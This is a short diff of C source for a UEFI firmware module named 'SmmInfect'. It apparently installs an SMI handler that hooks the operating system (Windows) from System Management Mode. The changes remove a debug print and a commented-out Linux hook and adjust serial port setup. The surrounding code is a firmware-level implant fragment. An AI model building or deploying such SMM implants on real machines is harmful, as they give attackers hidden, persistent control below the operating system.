@@ -24,8 +24,6 @@ VOID EFIAPI SmiRendezvousHook(UINT64 CpuIndex);
 
 EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
 {
-  SERIAL_PRINT("[INFO] SMI-Handler Called!\r\n");
-
   GSmst2->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID**)&Cpu);
     
   if (!EFI_ERROR(SetupWindows(Cpu, GSmst2)))
@@ -36,12 +34,6 @@ EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buf
         return EFI_SUCCESS;
       }
   }
-
-  //if (!EFI_ERROR(SetupLinux(Cpu, GSmst2)))
-  //{
-  //    OS = TRUE;
-  //    // Linux hook not implemented yet
-  //}
 
   // Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
   //ClearCache();
@@ -66,7 +58,7 @@ EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE image, IN EFI_SYSTEM_TABLE* table)
   gBS = table->BootServices;
   gST = table;
 
-  SERIAL_INIT();
+  SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
 
   SERIAL_PRINT("[INFO] SmmInfect loading...\r\n");
 
